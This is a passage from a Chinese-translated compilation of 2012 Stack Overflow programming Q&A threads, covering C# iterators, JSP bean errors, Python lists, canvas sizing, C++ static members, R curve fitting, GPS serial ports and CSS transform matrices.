谈到`C#`，如果你想编写一个迭代器，如果源为 null 或为空，则不返回任何内容。这是一个例子：

```
public IEnumerable<T> EnumerateThroughNull<T>(IEnumerable<T> source)
{
    if (source == null)
        yield break;

    foreach (T item in source)
        yield return item;
} 
```

如果没有`yield break`. 它还指定迭代器已经结束。您可以将其`yield break`视为不返回值的 return 语句。

```
int i = 0;
while (true) 
{
    if (i < 5)       
        yield return i;
    else            
        yield break; // note that i++ will not be executed after this statement
    i++;
} 
```

# ios5 - XCode png压缩问题

> ID：13524058
> 
> 赞同：0
> 
> 时间：2012-11-23T06:23:48.050
> 
> 标签：ios5, xcode4.5

在测试期间，我在 Xcode 中发现了一些奇怪的东西。我有一个大小为 2.2 mb 的 png，并且 png 压缩在存档后的构建设置中为“是”我提取构建并发现 Xcode 将 png 转换为 3.8 mb。然后在构建设置中使用相同的测试和 png 压缩为“否”，然后图像具有相同的 2.2 mb 大小。Xcode 是否在压缩后扩展 PNG 的大小？？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T06:27:42.953

在我自己的所有应用程序中，我将 PNG 压缩设置为**关闭**，因为 Apple 在处理应用商店提交过程中无法识别的压缩应用程序图标（PNG 格式）时一直存在问题。

而且由于您看到自己的应用程序的 PNG 压缩非常糟糕，您不妨将 PNG 压缩设置为禁用。

PNG 压缩对于内置大量 PNG 图形（尤其是较大的 PNG 文件）的应用程序*可能*很有用。

# java - 为什么在运行 java web 应用程序时出现以下错误？

> ID：13524066
> 
> 赞同：0
> 
> 时间：2012-11-23T06:24:50.577
> 
> 标签：java, jsp, javabeans

我正在关注本教程 [http://netbeans.org/kb/docs/web/quickstart-webapps.html](http://netbeans.org/kb/docs/web/quickstart-webapps.html)

如前所述，我创建了两个 jsp 页面。我的 index.jsp 页面看起来像这样

```
%@page contentType="text/html" pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>JSP Page</title>
    </head>
    <body>

        Name<form name="Name Input Form" action="response.jsp">
            <input type="text" name="name" value="" />
            <input type="submit" value="OK" />
        </form>

    </body>
</html> 
```

我的 response.jsp 看起来像这样

```
<%@page contentType="text/html" pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>JSP Page</title>
    </head>
    <body>

        <jsp:useBean id="useBean" scope="session" class="abc.NameHandler" />

        <jsp:setProperty name="myBean" property="name" /><h1>Hello</h1>
        <jsp:getProperty name="myBean" property="name" />

    </body>
</html> 
```

我创建了一个名为 abc 的包，其中我定义了一个名为 NameHandler 的类。

```
package abc;

public class NameHandler 
{

    private String name;

    public NameHandler() 
    {
        name =null;

    }

    /**
     * @return the name
     */
    public String getName() {
        return name;
    }

    /**
     * @param name the name to set
     */
    public void setName(String name) {
        this.name = name;
    }
} 
```

当我运行项目时 index.jsp 正确显示并且它命令输入名称并且它有一个提交按钮。现在当我按下提交按钮时出现以下错误。

```
HTTP Status 500 -

type Exception report

message

descriptionThe server encountered an internal error () that prevented it from fulfilling this request.

exception

org.apache.jasper.JasperException: java.lang.NullPointerException

root cause

java.lang.NullPointerException

note The full stack traces of the exception and its root causes are available in the GlassFish Server Open Source Edition 3.1 logs.
GlassFish Server Open Source Edition 3.1 
```

而且我不知道为什么会出现此错误。有人可以解释一下吗？

**[更新]**

这个错误是什么意思？

```
WARNING: StandardWrapperValve[jsp]: PWC1406: Servlet.service() for servlet jsp threw exception
java.lang.NullPointerException
    at org.apache.jasper.runtime.JspRuntimeLibrary.internalIntrospecthelper(JspRuntimeLibrary.java:368)
    at org.apache.jasper.runtime.JspRuntimeLibrary.introspecthelper(JspRuntimeLibrary.java:354)
    at org.apache.jsp.response_jsp._jspService(response_jsp.java from :68)
    at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:111)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:848)
    at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:403)
    at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:492)
    at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:378)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:848)
    at org.apache.catalina.core.StandardWrapper.service(StandardWrapper.java:1534)
    at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:281)
    at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:175)
    at org.apache.catalina.core.StandardPipeline.doInvoke(StandardPipeline.java:655)
    at org.apache.catalina.core.StandardPipeline.invoke(StandardPipeline.java:595)
    at com.sun.enterprise.web.WebPipeline.invoke(WebPipeline.java:98)
    at com.sun.enterprise.web.PESessionLockingStandardPipeline.invoke(PESessionLockingStandardPipeline.java:91)
    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:162)
    at org.apache.catalina.connector.CoyoteAdapter.doService(CoyoteAdapter.java:326)
    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:227)
    at com.sun.enterprise.v3.services.impl.ContainerMapper.service(ContainerMapper.java:170)
    at com.sun.grizzly.http.ProcessorTask.invokeAdapter(ProcessorTask.java:822)
    at com.sun.grizzly.http.ProcessorTask.doProcess(ProcessorTask.java:719)
    at com.sun.grizzly.http.ProcessorTask.process(ProcessorTask.java:1013)
    at com.sun.grizzly.http.DefaultProtocolFilter.execute(DefaultProtocolFilter.java:225)
    at com.sun.grizzly.DefaultProtocolChain.executeProtocolFilter(DefaultProtocolChain.java:137)
    at com.sun.grizzly.DefaultProtocolChain.execute(DefaultProtocolChain.java:104)
    at com.sun.grizzly.DefaultProtocolChain.execute(DefaultProtocolChain.java:90)
    at com.sun.grizzly.http.HttpProtocolChain.execute(HttpProtocolChain.java:79)
    at com.sun.grizzly.ProtocolChainContextTask.doCall(ProtocolChainContextTask.java:54)
    at com.sun.grizzly.SelectionKeyContextTask.call(SelectionKeyContextTask.java:59)
    at com.sun.grizzly.ContextTask.run(ContextTask.java:71)
    at com.sun.grizzly.util.AbstractThreadPool$Worker.doWork(AbstractThreadPool.java:532)
    at com.sun.grizzly.util.AbstractThreadPool$Worker.run(AbstractThreadPool.java:513)
    at java.lang.Thread.run(Thread.java:619) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T08:37:31.517

`jsp:useBean`和`jsp:setProperty`/中的 bean 的 ID 和名称`jsp:getProperty`应匹配：

```
 <jsp:useBean id="myBean" scope="session" class="abc.NameHandler" />

   <jsp:setProperty name="myBean" property="name" /><h1>Hello</h1>
   <jsp:getProperty name="myBean" property="name" /> 
```

# python - 在函数中返回列表

> ID：13524067
> 
> 赞同：1
> 
> 时间：2012-11-23T06:25:03.090
> 
> 标签：python, list

我意识到函数中的返回中断，因此我需要找到另一种方法来返回修改后的列表。

```
def multiply(lst):
    new = ''
    for i in range(len(lst)):
        var = lst[i] * 3
        new = new + str(var)
    return new
list1 = [1,2,3]
received = multiply(list1)
print [received] 
```

我正在尝试将所有元素乘以 3 并返回（我必须使用返回）。这只是给回报

> ['369']

我要返回的列表是

> [3,6,9]

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-23T06:28:19.210

试试这个：

```
def multiply(lst):
    return [val*3 for val in lst]

list1 = [1,2,3]
received = multiply(list1)
print received 
```

如果您想要就地编辑，您可以执行以下操作：

```
def multiply(lst):
    for idx,val in enumerate(lst):
        lst[idx] = val*3
    return lst 
```

您的代码中的问题是您正在合并字符串“3”、“6”和“9”并返回一个包含字符串（“369”）的变量，而不是将这个字符串放入列表中。这就是为什么你有 ['369'] 而不是 [3,6,9]。请在下面的注释中找到你的代码：

```
def multiply(lst):
    new = '' # new string
    for i in range(len(lst)): # for index in range of list size
        var = lst[i] * 3 # get value from list and mupltiply by 3 and then assign to varible
        new = new + str(var) # append to string new string representation of value calculated in previous row
    return new #return string 
```

在任何情况下都是通过使用变量来调试代码的好方法——尽管如果你在代码中放置打印，你就会明白那里发生了什么

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-23T06:41:41.567

那是因为`new`不是列表。在第一行`multiply()`，你做`new = ''`。这意味着这`new`是一个字符串。

对于字符串，加法运算符`+`, 执行*连接*。也就是说：

```
'a' + 'b' => 'ab' 
```

同样：

```
'1' + '2' => '12' 
```

或者

```
new = ''
new + str(var) => '' + '3' => '3' 
```

显然，这不是你想要的。为了做你想做的事，你应该构造一个*新*列表并返回它：

```
def multiplyBy3(lst):
    newList = [] #create an empty list
    for i in range(len(lst)):
        newList.append(lst[i] * 3)
    return newList 
```

当然，通过索引访问列表元素并不是很“pythonic”。经验法则是：“除非您需要知道列表元素的索引（在这种情况下您不需要），否则迭代列表的*值*”。我们可以相应地修改上面的函数：

```
def multiplyBy3(lst):
    newList = [] 
    for item in lst: #iterate over the elements of the list
        newList.append(item * 3)
    return newList 
```

最后，python 有一个叫做*[list comprehension](http://docs.python.org/2/tutorial/datastructures.html#list-comprehensions)*的东西，它和上面做的一样，但是以更简洁（和更快）的方式。这是首选方法：

```
def multiplyBy3(lst):
    return [item * 3 for item in lst] #construct a new list of item * 3. 
```

有关列表推导的更多信息，请参阅以下教程： http: [//www.blog.pythonlibrary.org/2012/07/28/python-201-list-comprehensions/](http://www.blog.pythonlibrary.org/2012/07/28/python-201-list-comprehensions/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T06:30:17.737

```
>>> multiply = lambda l: map(lambda x: x*3, l)
>>> multiply([1,2,3])
[3, 6, 9] 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-23T06:36:24.833

工作轻松...

```
print [3 * x for x in [1, 2, 3]] 
```

# c# - DataList ItemCommand 在 asp.net C# 中搞砸我？

> ID：13524068
> 
> 赞同：0
> 
> 时间：2012-11-23T06:25:10.917
> 
> 标签：c#, asp.net, datalist

我有这样的设计，它在用户控件中

```
<table>
    <tr>
        <td>
            <asp:DataList ID="dlimgShowCase" runat="server" RepeatDirection="Horizontal" EnableViewState="true">
                <ItemTemplate>
                    <asp:Image ID="imgCatalog" runat="server" Height="292" Width="454" ImageUrl='<%# Eval("path") %>' />
                </ItemTemplate>
            </asp:DataList>
        </td>
    </tr>
    <tr>
        <td>
            <asp:DataList ID="dlPaging" runat="server" class="more_pages_navigation" RepeatDirection="Horizontal"
                Width="100" OnItemCommand="dlPaging_ItemCommand" OnItemDataBound="dlPaging_ItemDataBound"
                EnableViewState="true">
                <ItemTemplate>
                    <li>
                        <asp:LinkButton ID="lnkbtnPaging" runat="server" CommandArgument='<%# Eval("PageIndex") %>'
                            CommandName="Paging" Text='<%# Eval("PageText") %>' Style="text-align: center"
                            OnClick="lnkbtnPaging_Click">   </asp:LinkButton>
                    </li>
                </ItemTemplate>
            </asp:DataList>
        </td>
    </tr>
</table> 
```

我的 C# 代码是

```
 if (!IsPostBack)
        {
            BindDataItems();              
        }    

 /// <summary>
    /// Binding Images List
    /// </summary>
    private void BindDataItems()
    {
        // If the DataSource Tables are greater than 1            
        try
        {

            if (Cache["DataShowcaseImages"] == null)
                Cache["DataShowcaseImages"] = DataSource.Tables[0];

            objPagedDataSourceCatalogList.DataSource = ((DataTable)(Cache["DataShowcaseImages"])).DefaultView;
            objPagedDataSourceCatalogList.AllowPaging = true;
            objPagedDataSourceCatalogList.PageSize = PageSize;
            objPagedDataSourceCatalogList.CurrentPageIndex = CurrentPage;
            ViewState["TotalPages"] = objPagedDataSourceCatalogList.PageCount;
            dlimgShowCase.DataSource = objPagedDataSourceCatalogList;
            dlimgShowCase.DataBind();
            performPaging();  // This method bind my second grid,, with page numbers
        }
        catch (Exception)
        {

            throw;
        }

    } 
```

我的分页 itemcommand 事件是

```
 protected void dlPaging_ItemCommand(object source, DataListCommandEventArgs e)
    {
        if (e.CommandName.Equals("Paging"))
        {
            CurrentPage = Convert.ToInt16(e.CommandArgument.ToString());
            BindDataItems();
        }
    } 
```

但我不知道为什么项目命令事件没有引发？谁能帮我解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T07:01:44.367

也许您没有将实际分配`DataSource`给`DataList`，请改用这段代码：

```
objPagedDataSourceCatalogList.DataSource = ((DataTable)(Cache["DataShowcaseImages"])).DefaultView;
objPagedDataSourceCatalogList.AllowPaging = true;
objPagedDataSourceCatalogList.PageSize = PageSize;
objPagedDataSourceCatalogList.CurrentPageIndex = CurrentPage;
ViewState["TotalPages"] = objPagedDataSourceCatalogList.PageCount;
dlimgShowCase.DataSource = objPagedDataSourceCatalogList.DataSource;
dlimgShowCase.DataBind(); 
```

# android - Android中的选择器

> ID：13524073
> 
> 赞同：0
> 
> 时间：2012-11-23T06:25:37.410
> 
> 标签：android, cocos2d-iphone

由于我是 Android 中 cocos2D 的新手，但在 ios 方面有一些经验，所以我打算在单击我的 CCMenuItem 时触发一个事件...在 IOS 环境中通过在最后一个参数中指定选择器来完成相同的操作，所以如何在 Android 开发中调用选择器或可能的本地函数/过程来实现相同的要求。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T05:06:29.283

最后，知道了如何做到这一点......我很清楚那些曾经或将来面临此类问题的人，所以他们可以解决。如有任何疑问，请随时询问。

至于答案部分，请查看以下链接： http: [//pastie.org/5426180](http://pastie.org/5426180)

# javascript - 获取画布元素的高度

> ID：13524074
> 
> 赞同：0
> 
> 时间：2012-11-23T06:25:44.073
> 
> 标签：javascript, canvas

我创建了一个简单的画布元素

```
<canvas style="width:100%;height:100%;" id="canvas"></canvas> 
```

当我尝试获取高度时，但是在 javascript 中：

```
var canvas = document.getElementById(config.elementId);
console.log(canvas.height); //150
console.log(canvas.width); //300

console.log(canvas.style.height); //100%
console.log(canvas.style.width); //100% 
```

如果我在 chrome 的调试器中检查元素，并且实际上将鼠标悬停在元素上，则 chrome 将元素大小报告为

```
1627x925px 
```

我到底如何`1627x925px`在 js 中进行测量？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T07:30:19.730

正如@Alex 所说，**您可以使用该`getComputedStyle`函数获取**画布的当前大小。

**但是...**要使画布始终全屏宽度和高度，这意味着即使调整浏览器大小，您也需要在将画布大小调整为`window.innerHeight`and的函数中运行绘制循环`window.innerWidth`。

一旦你这样做了，你就可以使用 normal`canvas.height`和`canvas.width`函数来获得正确的画布大小：

```
(function() {
    var canvas = document.getElementById('canvas'),
    context = canvas.getContext('2d');

    // resize the canvas to fill browser window dynamically
    window.addEventListener('resize', resizeCanvas, false);

    function resizeCanvas() {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;

        /* Your drawings need to be inside this function
         * to avoid canvas to be cleared. */
        drawStuff(); 
    }
    resizeCanvas();

    function drawStuff() {
        console.log(canvas.height); //925
        console.log(canvas.width); //1627
        // do your drawing stuff here
    }
})(); 
```

**另外：**使用这个 CSS hacks 使画布全尺寸没有问题：

```
/* remove the top and left whitespace */
* { margin:0; padding:0; } 

/* just to be sure these are full screen*/
html, body { width:100%; height:100%; }

/* To remove the scrollbar */
canvas { display:block; } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T06:45:55.500

我们可以监视计算的样式！

```
document.defaultView.getComputedStyle(canvas).height
document.defaultView.getComputedStyle(canvas).width 
```

# mysql - Innochecksum 错误统计文件：对于定义的数据类型，值太大

> ID：13524077
> 
> 赞同：1
> 
> 时间：2012-11-23T06:26:07.933
> 
> 标签：mysql, mysqldump

当我尝试运行命令 innochecksum -d {mysqldump_backup.sql} 它返回 --error statting file: Value too large for defined data type

我能够加载 {mysqldump_backup.sql}。

关于为什么 innochecksum 失败的任何指示？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T09:30:55.533

我已经等了很长时间才能找到上述查询的任何可能答案。在这种情况下，唯一可能的答案似乎是默认情况下，32 位版本的 innochecksum 不支持大文件。参考[http://bugs.mysql.com/bug.php?id=55713](http://bugs.mysql.com/bug.php?id=55713) 正如上面的错误中提到的 建议修复：还编译具有大文件支持的 32 位 MySQL 二进制文件，因为它很容易发生，即 InnoDB 表空间文件变得大于 2 GB！在我的情况下是正确的，因为我输入到 innochecksum 的 sql_dump 是 2.3 GB。

我想我得到了我想要的，但是重新编译是另一回事，因此关闭了。

# c++ - C++类中static int和just int的区别

> ID：13524078
> 
> 赞同：3
> 
> 时间：2012-11-23T06:26:08.503
> 
> 标签：c++

> **可能重复：**
> [static int a 和 int a 有什么区别？](https://stackoverflow.com/questions/4792048/what-is-the-difference-between-static-int-a-and-int-a)

我试图用简单的英语做一个简单的解释。我试图阅读和研究和之间的区别`static int`，`int`但无论我读到什么，它似乎都让我更加困惑。假设我在下面有一堂这样的课

```
class B{
  static int i;
  int i;
  ...
} 
```

简单的英语，两者有什么区别？想象一下，您正在向非程序员解释。[有人在这里](https://stackoverflow.com/questions/4792048/what-is-the-difference-between-static-int-a-and-int-a)问过类似的问题，但这并不令我满意。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-23T06:29:58.013

这是给你的一个比喻。

想象一个拥有银行账户的组织。就 C++ 而言，该组织是您的`class`. 想象一下，组织有代表（工人，如果你愿意的话）。就 C++ 而言，它们是该类的实例（或变量）。

现在，每个代表都可以拥有自己的银行帐户，该帐户仅供他使用。没有其他人可以使用它。那将是正常的`int`。

但是，每个工人也可以使用组织的银行帐户，该帐户由他们所有人共享，并且不属于他们中的任何一个。那是你的`static int`。

* * *

现在，再次回到技术术语，以防您需要它。我会尽量简洁明了。

*   正常`int`：

    类类型的每个变量都有自己的个人变量。因此，在您的示例中，如果您创建 10 个类型的变量，则`B`每个变量都将在内部拥有自己*的* `int i`变量。

*   `static int`：

    静态变量是类的所有变量*共享*的。静态变量不属于任何类变量，它属于类本身。因此，如果您将创建 10 个类型的变量，它们中的`B`每一个都将能够访问`static int i`，但它们都不会拥有它（它是共享的）。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-23T06:31:52.097

类中的静态意味着对象的所有*实例*：`B a,b,c,d;`具有完全相同的成员*i*。`a.i++`; 改变`b.i`等的`c.i`内容

static 类内部和外部的区别在于使静态变量仅对类可见或通过类可见。当然，变量不存储在类中，而是存储在其他地方。这种语法只允许将变量的*范围*定义到这个特定的类。

当然，非静态成员对于每个实例都是唯一的。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-23T06:31:13.287

如果您声明 B 的多个对象，则每个对象都将拥有自己的 int i 副本。但是，所有对象都只有一个静态 int i。

```
B::i //This will refer to the static i
//As you can see this is accessed through the class name

B obj, obj2;
obj.i //This will refer to the obj member i 
obj2.i // and will be different from this which is obj2 member i 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-23T06:38:29.837

为避免重复名称混淆，请设想以下情况：

```
`class foo
{
    public:
       int i;
       static int j;
};` 
```

``static int j;`定义了一个变量，称为`j`与类相关联`foo`。无论`foo`您创建多少类型的对象，都只会有一个`j`. 在这种情况下，类之外的任何东西都`foo`可以`j`使用语法访问`foo::j`。`

 `将其与 的定义进行对比`i`，后者是类型对象的成员`foo`。`i`为每个类型的对象创建一个唯一的`foo`。例如。

```
`foo myObject;
foo myOtherObject;

myObject.i = 42;
myOtherObject.i = 180;` 
````

# r - 在 R 中拟合“围绕”数据点的曲线

> ID：13524080
> 
> 赞同：8
> 
> 时间：2012-11-23T06:26:23.723
> 
> 标签：r, optimization

我有一个由一组点组成的数据集。这些点在平面上的分布方式使得它们可以大致以抛物线为界。我试图找到一种将抛物线拟合到点边界的方法。

这是我目前拥有的：

```
a = 1
b = 2
c = 3

parabola <- function(x) {
    a * x^2 + b * x + c
}

N = 10000

x <- runif(N, -4, 3)
y <- runif(N, 0, 10)

data <- data.frame(x, y)

data <- subset(data, y >= parabola(x))

plot(data, xlim = c(-5, 5), ylim = c(0, 10), col = "grey")

fr <- function(x) {
    PAR = x[1] * data$x^2 + x[2] * data$x + x[3]
    #
    sum((PAR - data$y)^2 + 100 * plogis(PAR - data$y, scale = 0.00001))
}

par = optim(c(0, 0, 0), fr)$par

a = par[1]
b = par[2]
c = par[3]

curve(parabola, add = TRUE, lty = "dashed") 
```

这将创建一个样本数据集，然后将曲线拟合到边界。目标函数由一个“正常”平方误差项组成，它适合数据的抛物线，以及第二个逻辑项，它惩罚位于抛物线下方的点。第二项的参数（100 和 0.00001）是通过反复试验确定的。

该代码绘制了点以及拟合的抛物线。

现在这个系统可以工作了……但只是在某些时候。有时它会产生完全错误的拟合，我猜在这些情况下，逻辑项的参数是不合适的。运行代码几次，看看我的意思。

我确信必须有一种更强大的方法来解决这个问题。想法和建议？

.

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-23T07:40:31.057

我无法提供完整的答案。我唯一的临时想法是为优化算法提供更好的起点——希望你更接近你尝试优化的函数的局部最小值。

估算一个粗略的第一个版本相当简单。如果你写出你`b*(x-a)^2+c` 可以估计的抛物线

```
a <- data$x[which.min(data$y)]
c <- min(data$y)

b1 <- (data$y[which.min(data$x)] - c) / (min(data$x) - a)^2
b2 <- (data$y[which.max(data$x)] - c) / (max(data$x) - a)^2
b <- mean(c(b1, b2)) 
```

* * *

## 编辑

我对我的建议和方法“BFGS”进行了另一次密集测试。我找不到使用以下方法的反例：

```
seed <- floor(runif(1,1,1000))
set.seed(seed)
a = 1
b = 2
c = 3

parabola <- function(x) {
    b * (x-a)^2 + c
}

N = 10000

x <- runif(N, -4, 3)
y <- runif(N, 0, 10)

data <- data.frame(x, y)

data <- subset(data, y >= parabola(x))

plot(data, xlim = c(-5, 5), ylim = c(0, 10), col = "grey")

fr <- function(x) {
    PAR = x[2] * (data$x - x[1])^2 + x[3]
    #
    sum((PAR - data$y)^2 + 100 * plogis(PAR - data$y, scale = 0.00001))
}

a <- data$x[which.min(data$y)]
c <- min(data$y)

b1 <- (data$y[which.min(data$x)] - c) / (min(data$x) - a)^2
b2 <- (data$y[which.max(data$x)] - c) / (max(data$x) - a)^2
b <- mean(c(b1, b2))

par = optim(c(a, b, c), fr, method="BFGS")$par

a = par[1]
b = par[2]
c = par[3]

curve(parabola, add = TRUE, lty = "dashed") 
```

但是，不能保证正确收敛。我尝试了大约 50 个案例，一切都很顺利。您的结果是否经过审核，还是必须自动正确运行？

* * *

## 编辑 2

我对如何更新目标函数以使其更可靠有一些想法。现在我没有时间制定一个完整的解决方案，但也许这些想法可以帮助你：

我们的日期在`range(data$x)`. 现在我们想找到一条尽可能适合该数据下边界的抛物线 - 或者换句话说，找到最大化的值 a,b,c

```
\int_{\range(x)} ax^2 + bx+c dx 
```

（请原谅笨拙的 LaTeX - 有时写公式会更好）。

现在，抛物线以下的惩罚点可以使用惩罚函数来完成，例如

```
\lambda (ax_i^2+bx_i+c - y_i)^2 if below parabola, 0 otherwise 
```

从区间中减去该函数应该会给您一个合适的、平滑的目标函数。尽可能地简化函数似乎是比使用最小二乘法更好的模型，最小二乘法试图拟合一条穿过数据点*中间*的线。

不过，您仍然必须选择合适的 lambda。但这是典型的：您需要在两个不同的目标（拟合数据、最大化抛物线）之间进行折衷。哪个更重要的重量必须由您提交。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T07:03:57.750

进一步感谢 thilo 非常有用的建议并纠正了我的幼稚想法。根据 thilo 的建议，使用抛物线下的面积和合适的惩罚函数，下面的解决方案似乎有效。我也改用 L-BFGS-B 优化，因为它在小 N 时表现更好。

```
parabola.objective <- function(p) {
    d = p[2] * (data$x - p[1])^2 + p[3] - data$y
    #
    area <- function(x) {
        p[2] / 3 * (x - p[1])^3 + p[3] * x
    }
    #
    sum(- area(max(data$x)) + area(min(data$x)) + 100 * ifelse(d > 0, d^2, 0))
}

A <- data$x[which.min(data$y)]
C <- min(data$y)

B1 <- (data$y[which.min(data$x)] - C) / (min(data$x) - A)^2
B2 <- (data$y[which.max(data$x)] - C) / (max(data$x) - A)^2
B <- mean(c(B1, B2))

# the key to getting this working with a small number of points is the
# optimisation method: BFGS works well with around 300 points or more
# but L-BFGS-B seems to perform better down to around 100 points.
#
O = optim(c(A, B, C), parabola.objective, method="L-BFGS-B")

par = O$par

A = par[1]
B = par[2]
C = par[3]

curve(parabola, add = TRUE, lty = "dashed") 
```

# c++ - 如何在我的程序中检测 GPS 设备所连接的端口（C/C）

> ID：13524084
> 
> 赞同：0
> 
> 时间：2012-11-23T06:26:39.400
> 
> 标签：c++, c, gps, serial-port, nmea

我正在编写一个程序来绘制路线。有没有办法找出 GPS 设备连接的端口？我现在可以列出所有可用的端口。但最好列出 GPS 设备端口。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-23T06:35:48.670

做到这一点的唯一方法是打开每个端口，并稍微监听一下 NMEA 数据。端口属性不会根据通过它发送的数据而改变。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T06:35:26.717

串行硬件中没有任何标准可以轻松识别（如 USB 中的 deviceid）。在 nmea 协议的情况下，您只需要打开每个端口并查看 nmea 数据来自哪个端口。然后关闭您不需要的端口。

# ajax - struts2 ajax 带复选框

> ID：13524089
> 
> 赞同：2
> 
> 时间：2012-11-23T06:27:16.430
> 
> 标签：ajax, jsp, struts2

我无法使用带有 id( `<div id="reverse" style="position:absolute; left:500px; top:379px;"></div>`) 的 div 将我的名为复选框的 ajax 放在正确的位置，我如何才能将它们放在一行三列中。如果我使用此代码，我无法在名为 modNameCheck 的选择框之后定位它。相反，它出现在选择框的一侧

```
<s:form action="queueform1.action" name="queueform1" method="post" >

   <s:select label="Flow Name" list="flowNameList" name="flowNameCheck" >
       <s:iterator status="stat" value="flowNameList">
       </s:iterator>   
   </s:select> 
   <s:textfield name="formnam" value="" label="Form Name"/>
   <s:textfield name="formhead"  value="" label="Form Heading"/>
   <s:checkbox  name="initiator" fieldValue="yes" 
                label="Click here if initiator"/>
   <s:textfield name="compldays"  value="" label="Complete day"/>
   <s:select label="Department" list="modNameList" 
             name="modNameCheck" id="detail" onchange="chk3()">
       <s:iterator status="stat" value="modNameList">
       </s:iterator>   
   </s:select>
   <div id="reverse" style="position:absolute; left:500px; top:379px;">
   </div>
   <s:textfield  name="getcheckid" value=""/>
   <s:submit value="Save" align="center" />     

</s:form> 
```

我的ajax代码是：

```
<script type="text/javascript">        
    chk3=function()
    {
       //alert("hai!!");
       //$("#hide").hide();
       var vals2=$("#detail").val();
       //alert(vals2);
       $.post("userQueueAjaxForm.jsp",{modName:vals2},function getattname(data)
       {
        $("#reverse").html(data);

       });                       
    }    
</script> 
```

我称为复选框的 ajax 是

```
while(rs.next())
{ 

   %>    

   <input type="checkbox" id='attributeNameCheck[<%=i%>]' name="checkname"  
      onclick="attributeformcreation('queueform1','attributeNameCheck[<%=i%>]');"
      value="<%=rs.getString(1)%>"><%=rs.getString(2)%>

   <%i++;%>

   <%
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T09:31:03.810

您正在使用 Scriptlet ( `<%`, `<%=`...)。

小脚本很糟糕。

我强烈建议看看如何在没有 Scriptlets 的情况下以纯 Struts2 方式重构它......那里有很多例子；）

也就是说，您的问题与 Struts2 或 Ajax 无关，它是简单的 css：

你只是缺少

```
display: inline-block; 
```

进入您的 div （作为块级元素，默认情况下提供新行）。

然后：

```
<div id="reverse" style="display: inline-block;"></div> 
```

应该按预期工作。

然后使用 div 的边距/填充来获得所需的结果。

# javascript - Javascript/jQuery 如何从矩阵值中获取刻度值

> ID：13524092
> 
> 赞同：4
> 
> 时间：2012-11-23T06:27:17.600
> 
> 标签：javascript, jquery, matrix, scale

首先获取一个矩阵。

```
this.getMatrix = function(obj)
{
    var matrix = obj.css("-webkit-transform") ||
                 obj.css("-moz-transform")    ||
                 obj.css("-ms-transform")     ||
                 obj.css("-o-transform")      ||
                 obj.css("transform");
    return matrix;
}; 
```

并且获得了规模的价值。

```
this.getScaleDegrees = function(obj)
{
    var matrix = this.getMatrix(obj),
        matrixRegex = /matrix\((-?\d*\.?\d+),\s*0,\s*0,\s*(-?\d*\.?\d+),\s*0,\s*0\)/,
        matches = matrix.match(matrixRegex);
    return matches;
}; 
```

并获得一个旋转的值。

```
this.getRotationDegrees = function(obj)
{
    var matrix = this.getMatrix(obj),
        angle = 0;

    if(matrix !== 'none') {
        var values = matrix.split('(')[1].split(')')[0].split(','),
            a = values[0],
            b = values[1];
        angle = Math.round(Math.atan2(b, a) * (180/Math.PI));
    }

    return angle;
}; 
```

现在，我面临一个问题。
当元素同时存在旋转和缩放时，函数“getScaleDegrees”失败。
由于函数'getRotationDegrees'正常运行，
我想我将在函数'getRotationDegrees'的过程的帮助下编辑函数'getScaleDegrees'。

所以，问题是如何获得规模的价值。

有什么好的想法或计算方法吗？

* * *

编辑：

有一个改变比例和旋转的功能，并且比例和旋转的值每次都不同。函数'getMatrix'返回的值变成这样。

```
none [no rotate & no scale]  
matrix(1.2, 0, 0, 1.2, 0, 0) [edit scale]  
matrix(0.965926, -0.258819, 0.258819, 0.965926, 0, 0) [edit rotate]  
matrix(1.3523, -0.362347, 0.362347, 1.3523, 0, 0) [edit rotate & edit scale] 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-03T02:46:37.550

提出了一种解决方案。

将矩阵转换为数组（thanx eicto）

```
this.parseMatrix = function(_str)
{
    return _str.replace(/^matrix(3d)?\((.*)\)$/,'$2').split(/, /);
}; 
```

获取刻度的值

```
this.getScaleDegrees = function(obj)
{
    var matrix = this.parseMatrix(this.getMatrix(obj)),
        scale = 1;

    if(matrix[0] !== 'none') {
        var a = matrix[0],
            b = matrix[1],
            d = 10;
        scale = Math.round( Math.sqrt( a*a + b*b ) * d ) / d;
    }

    return scale;
}; 
```

